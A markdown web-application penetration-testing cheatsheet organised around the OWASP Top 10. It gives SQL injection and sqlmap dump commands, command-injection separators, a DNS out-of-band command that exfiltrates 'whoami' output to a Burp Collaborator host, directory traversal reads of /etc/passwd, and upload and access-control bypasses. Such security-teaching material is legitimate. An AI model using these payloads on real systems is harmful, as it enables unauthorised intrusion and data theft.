
# Methodology // Exploitation Cheatsheet

[OWASP Top 10](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)

[OWASP checklist](https://github.com/tanprathan/OWASP-Testing-Checklist)

  - Follow along with [OWASP release 4.0](https://www.owasp.org/images/1/19/OTGv4.pdf) for each section

<details>
  <summary>Enumeration</summary>
  <br>
  
  ## Content discovery
  
   - What is the server running on/versions?
    - Wappalyzer 
    - Response headers
    - Inspect source
    - Fingerprint server
    
          httprint -P0 -h <IP> -s /usr/share/httprint/<signature file>
  
  ## Vulnerability/misconfiguration scanning
  
   - Nikto 
   
     with credentials  -id <user>:<pass>
   
   - [Header scanning](https://securityheaders.com/)

  
  [Visual site mapper](http://www.visualsitemapper.com/)
  
  Wappalyzer extension for server/web app details
  
  ## Subdomain discovery
  
  - Sublist3r (scraping)
  - SubFinder-o
  - [assetfinder](https://github.com/tomnomnom/assetfinder)
   
        assetfinder <domain.TLD>
        
         By default will also find related assets that may not be in the searched domain.
        
          --subs-only   #will only find subdomains
   
  - AMass
  
  - [gowitness](https://github.com/sensepost/gowitness)
  
     Takes screenshots of websites
  
  - [httprobe](https://github.com/tomnomnom/httprobe)
  
      Will check if subdomains responds
 
  - [waybackurls](go get github.com/tomnomnom/waybackurls)
  
      Checks URLs against the wayback machine
  
  ## Directory discovery
  
  - gobuster 
      
        gobuster dir -u <URL> -w <wordlist>
        
         -c <cookie> specify cookie
        
         -e <extensions>
         
         -P string
                 Password for Basic Auth (dir mode only)
         -U string
                 Username for Basic Auth (dir mode only)
  
 Wordlists
 
    /usr/share/wordlists/dirb/
    /usr/share/wordlists/dirbuster/
</details>

<details>
<summary>Learning the application</summary>
  While running Burp, run through the site.
  How is everything handled? (pages, files, auth)
  What is the application for? (Photo storage, blog, store)
  
</details>

<details>
  <summaryHTTP version syntax</summary>
  <br>
  
  **HTTP/1.0** 
   
      GET <resource> HTTP/1.0
      
  **HTTP/1.1** 
   
      GET <resource> HTTP/1.0
      Host: <domain>.<tld>
  
</details>


<details>
  <summary>Exploiting Misconfigured HTTP Verbs</summary>
  <br>
  
  **DELETE** 
   
        DELETE  <resource> HTTP/1.0
        
  **PUT**
  
        PUT /<filename for upload> HTTP/1.0 
        Content-type: text/html
        Content-length: <size of upload. Burp will auto count>
        
        
        <script>
  
</details>

-----------------------------------------------------------------------------

<details>
  <summary>SQLi</summary>
  <br>
  
  [SQL Syntax](https://www.w3schools.com/sql/sql_intro.asp) 
  
  [Injection](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)
  
  SQL statements begin with verbs.
 - Common SQL verbs:
        - SELECT
        - INSERT
        - DELETE
        - UPDATE
        - DROP
        - UNION
   
   - Terms:
        - WHERE - Filters records based on specific condition
        - AND/OR/NOT - Filter records based on multiple condtions
        - ORDER BY - Sorts records in ascending/descending order
        
   - Special characters:
        - ' and " - string delimeters
        - -- , /* and #  - Comment delimiters
        - * and %  - wildcards
        - ; - ends SQL statement
        - Others that follow programmatic logic - = , + , > , < , () , etc
        
   **Test vectors**
   
     - GET parameters
    
        Note on comments for GET requests: not just two dashes and a space, also add a third dash. Because most of the browsers automatically remove trailing spaces in the URL so, if you need to inject a comment via a GET request, you have to add a character after the trailing space of the comment i.e. -- -
     
     - POST parameters
     - HTTP Headers
       - UA
       - Cookies
       - Accept 
       - Etc
       
   **Test input**
   
     •String terminators: 'and "
     •SQL commands: SELECT, UNION, and others
     •SQLcomments:#or--
     • Closing off '))-- for URL parameters. Then try to move to a UNION SELECT
     
      **Exploit**
         
  **Boolean based SQLi**
  
   Trying blind SQL to figure out the contents of a field
  
       ' or substr(user(), 2, 1)= 'a
       
  **Union based**
  
   For if output is directly displayed on the output page. To exploit a SQL injection, you first need to know how many fields the vulnerable query selects. Which is done by trial and error.
   
    ' UNION SELECT null; --
    ' UNION SELECT null, null; --
    
   Example: 
     
    '))-- UNION SELECT 1,2,3,4,5,6,7,8,<payload>
     
      payloads: 
      
        <SQL version>_version()--
        <table name>

  Each null represents a field. Usually an SQL error page will represnt that we have the wrong number of fields. An SQL "false" (try to determine this once an SQLi has been discovered, i.e paramter image=<sql>, true=image loads, false=broken image) condition will represent that we have guessed the correct total of fields (do one extra just in case). 
  
   Other payloads:
   
     ' UNION SELECT <SQL command>; --
     
     user() gets user running SQL
     
 SQLMap once vectors have been identified: 
 
   [Cheatsheet 1](https://gist.github.com/jkullick/03b98b1e44f03986c5d1fc69c092220d)
   
   sqlmap with GET request
   
     sqlmap -u <url><resource>?id=1 -p id
     
   sqlmap with POST request
   
     use Burp to save the injectable request to a text file
     
     sqlmap -r POSTrequest.txt -p <injectable parameter>
     
   Get tables
     
     sqlmap -u <url><resource>?id=1 -p id --tables
     
   Get contents
   
    sqlmap -u <url><resource>?id=1 -D awd -T accounts --dump

   SQL query example:
   
        <verb> <* or column> FROM <Table name> WHERE <Term / Condition> 
</details>


<details>
  <summary>Broken Authentication</summary>
  <br>
   
   [Broken Authentication](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication)

   Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently.
   
    - Testing login/password recovery error for username enumeration
    
    - Session fixation
        - How are session IDs handled? In URL or cookie? Are they encrypted/handled properly?
        - Does logging out revoke the cookie? Immediatly?
        - Is there a timeout on the session cookie?

</details>


<details>
  <summary>Sensitive Data Exposure</summary>
  <br>
   
 [Sensitive Data Exposure](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)
 
 Many web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data may be compromised without extra protection, such as encryption at rest or in transit, and requires special precautions when exchanged with the browser.
 
   - Stored credentials in site/site scripts
   
   - Backup directories
   
   - Dev directories
   
   - Internal data
   
   - Not in a dir accessable to anyone
   
   - Not Encrypted sensitive data if accessible
   
   - Are appropriate headers applie so attacks against a session cannot occur? Mitm/downgrade/etc
      - [Header scanning](https://securityheaders.com/)
      
   - Does it support new/degraded encryption. 
       
         nmap --script=ssl-enum-ciphers -p 443 <URL>
</details>


<details>
  <summary>XXE</summary>
  <br>
   
   [XML External Entities](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-XML_External_Entities_(XXE))
   
   Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks. An XML entity is like a variable that you can call into the page later. On the page you care only able to use alphanumeraic characters for strings, however you can call in an entity that contains special characters. You will notice the SYSTEM key word to let the parser know that the resource is external, i.e can pull data from the system. 
   
   [XXE Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
   
  
</details>

<details>
  <summary>Broken Access Control</summary>
  <br>
  
  [Broken Access Controls](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control)
  
  Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access other users’ accounts, view sensitive files, modify other users’ data, change access rights, etc


   - Look for client side code that handle data incorrectly
       - Hidden fields that have password/ UID data that can be minipulated
       - Cookies that improperly control access (i.e IsAdmin cookie)
       - 
   
   <details>
    <summary>403 restrictions bypass</summary>
     <br>
   
     Try other HTTP methods
   
       Try headers:
   
       X-Original-URL: <path>
     
       X-Rewrite-URL: <path>
   
   </details>
</details>


<details>
  <summary>Security Misconfiguration</summary>
  <br>

   [Security Misconfiguration](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration)
   
   Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information. Not only must all operating systems, frameworks, libraries, and applications be securely configured, but they must be patched/upgraded in a timely fashion.
</details>


<details>
  <summary>XSS</summary>
  <br>
   [XSS](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)) 
    
   [Portswigger Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
   
   XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites. Note that reflected and DOM based XSS require social engineering. 
   
  [Payloads](https://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txt)
   
   Blacklist bypassing:
    
     - Pay around with what is beng removed with input is entered. 
     
      + 
      
      <<  >> /
      
      Uppercase/lowercase
      
      encoding
   
</details>

<details>
  <summary>Insecure Deserialization</summary>
  <br>
   
   [Insecure Deserialization](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A8-Insecure_Deserialization)
   
   Taking data that is serialized (taking data, and converting it to a different format), and deserializing it. Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks. 
   
   https://github.com/frohoff/ysoserial
   
</details>

<details>
  <summary>Using Components with Known Vulnerabilities</summary>
  <br>
   
   [Using Components with Known Vulnerabilities](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities)
   
   Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts. Look for CVE or known vulnerabilities with software versions the target is running.
</details>

<details>
  <summary>Insufficient Logging&Monitoring</summary>
  <br>
   
   [Insufficient Logging&Monitoring](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A10-Insufficient_Logging%252526Monitoring)
   
 Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring.
</details>


<details>
  <summary>Parameters</summary>
  <br>
  
  Garbage info ( symbols, negative intigers)
  
  Other account tokens, token mixing
  
  HPP
  
</details>


<details>
  <summary>File Upload</summary>
  <br>
  
  Things to think about:
  
    - File size limit for DoS
  
    - Santized filenames ? buffer overflow
  
    - How are zip files handeled if accepted?
  
    - How are files renamed / accessed
  
    - Check Content-Type header
    
    - is it a blacklist or a whitelist
    
    - How are the files being varified? Name, POST form or file content?
  
  Payloads: 
  
   ## manual testing bypass
    
    .PhP .php3 .php5
    
    .php00.png
    
    .php (1).png
  
  ## Use Burp intruder against the wordlist inder /usr/share/wordlists/dirb/
    
    
   ## Editing upload request 
</details>


<details>
  <summary>Open redirects</summary>
  <br>
 
  If the site redirects.
  
  Server side: 
   
    - Referer in Http request
    - Checking if only relative / are allowed. // is a protocol agnostic, absolute URL. Try that.
  
  Client side:
  
    - window.location how is it checked? 
</details>

<details>
  <summary>Privilege Escalation</summary>
  <br>
  
  Cookies:
     How are sessions being held in cookies. Vuln to tampering (no digital sig)?
     What other info is in the cookies? 
     Try to see if the server will take untrusted data from your requests.
     Encrypted?
      
  <details>
  <summary>Try Horizontal escalation:</summary>
  <br>
  Horizontal privilege escalation occurs when an application allows the attacker to gain access to resources which normally would have been protected from an application or user. The result is that the application performs actions with the same but different security context than intended by the application developer or system administrator; this is effectively a limited form of privilege escalation (specifically, the unauthorized assumption of the capability of impersonating other users). 
  </details>   

  Finding a way tio make requests as an admin 
   
  <details>
  <summary>Vertical Escalation</summary>
  <br>
  This type of privilege escalation occurs when the user or process is able to obtain a higher level of access than an administrator or system developer intended, possibly by performing kernel-level operations. 
  </details>
</details>

<details>
  <summary>Session Fixation</summary>
  <br>
  
  Can you take control of an authenticated users session using the sessionID.
  
  - Use the sessionID that has already been established
  
  - Craft a sessionID and see if that sticks. i.e www.site.com/login?jsessionID=CraftedID 
    Login and see if the sessionID stays the same.
  
</details>


<details>
  <summary>Command Injection</summary>
  <br>

 Areas with user input that could have its handleing manipulated to run an OS command.

   Parrameters sent such as those in URLs i.e ?filename=  or user input.
  
  Command seperators which allow for commands to be chained together. 
   nix/Windows
   
    & 
    && (extra & separates the injected command from whatever follows the injection point.)
    |
    ||
    
   Unix
    
    ;
    0x0a or /n (newline)
    
   Unix. Back ticks or dollar character can be used to perform inline execution of an injected command within the original command. 
     
    ' Command ' 
    $(Command)
    
  Note that the different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations, and whether they allow in-band retrieval of command output or are useful only for blind exploitation.

 Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to  terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command. 


  Useful commands 

    Purpose of command 	Linux 	Windows
    Name of current user 	whoami 	whoami
    Operating system 	uname -a 	ver
    Network configuration 	ifconfig 	ipconfig /all
    Network connections 	netstat -an 	netstat -an
    Running processes 	ps -ef 	tasklist 
    
   Blind:
    
   wait X seconds to test
   
     ping -c X 127.0.0.1 
     
   Rediecting blind output
   
    whoami > /<writable folder>
    
    Then naviage to that file  www.example.ca/<writeable file>
     
     
   Note that the file may only be accessable how the server allows it to be accessed. 
   Example: you write to an image directory but the server only allows the files to be accessed via 
      
       /image?filename=myfile.txt 
       so /image/myfile.txt may not work.
   
   Out-of-band
   
   Having the server interact with another system you control 
   
    ping BurpCollab
    
   Exfultrate data using out-of-band
   
    $(nslookup `whoami`.c2f2evzg76x5nz0z7m8uwsvvrmxdl2.burpcollaborator.net)
     
   Which will result in this request to my DNS server
    
   [![DNS-request.png](https://i.postimg.cc/L41gCYwc/DNS-request.png)](https://postimg.cc/23C536zG)

</details>

<details>
  <summary>Directory Traversal</summary>
  <br>
  Allows the reading of files on the server that is running the vulnerable application by manipulating a parameter. 
 
     /image?filename=../../../etc/passwd
 
 Attempt with abosule and relative paths as one or the other may be blocked/not blocked.
 
 Bypassing stripped traversal
 
  ....// and ...\/ will strip the detected ../ and ..\ from the centre and the outsides will come together to make ../.
  If what gets parsed / removed is responded use that to try to find a way to bypass. 
  
  encoding:
  
    ..%252f (takes away the 25 and you are left with the / encodded)
    ..%c0%af
  
  Some applications transmit the full path via the request, you may need to append your traversal to that.
 
    /image?filename=/var/www/images/../../../../etc.passwd
    
  Bypass required endings to a file
  
   %00 (null byte)
   
    passwd%00.png
    
  Note that depending on how the server sends thse back you may have to curl the request.
  
    curl https://ac8d1f3e1f7f4d4080c322dc0035009c.web-security-academy.net/image?filename=../../../../etc/passwd%00.jpg

 
</details>

<details>
  <summary>Sub Domain Takeover</summary>
  <br>
  
  If a sub domain that is found belonging to a target that is unused may be vulnerable to sub domain takeover. 
  
  Signs: 
  
  Exploit:
</details>


<details>
  <summary>SSRF</summary>
  <br>
  
  - Bypass SSRF fix. Change HTTP version from 1.1 to 0.9 and remove the host header completely. On HTTP/0.9 there is no need for a host header.
</details>



<details>
  <summary></summary>
  <br>
</details>
